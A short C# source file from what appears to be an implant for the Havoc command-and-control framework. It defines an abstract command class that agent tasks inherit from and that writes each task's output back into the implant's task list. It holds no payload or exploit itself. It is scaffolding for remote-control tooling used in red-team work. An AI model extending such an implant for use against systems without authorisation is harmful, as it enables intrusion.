using HavocImplant.Communications;
using System;

namespace HavocImplant.AgentFunctions
{
    public abstract class CommandInterface
    {
        public abstract string Command { get; }
        public abstract bool Dangerous { get; }

        public string Output;
        public Implant Agent;

        public void Init(Implant agent)
        {
            Agent = agent;
        }

        public abstract void Run(int taskId);
        public void ReturnOutput(int taskId)
        {
            // We cannot modify an index cause its no variable, so we must make new item
            Agent.taskingInformation[taskId] = new Implant.task {
                taskCommand = Agent.taskingInformation[taskId].taskCommand,
                taskArguments = Agent.taskingInformation[taskId].taskArguments,
                taskFile = Agent.taskingInformation[taskId].taskFile,
                taskOutput = Utils.CleanString($"[+] Output for [{Agent.taskingInformation[taskId].taskCommand}]\n" + Output)
            };
            Console.WriteLine(Agent.taskingInformation[taskId].taskOutput);
        }
    }
}
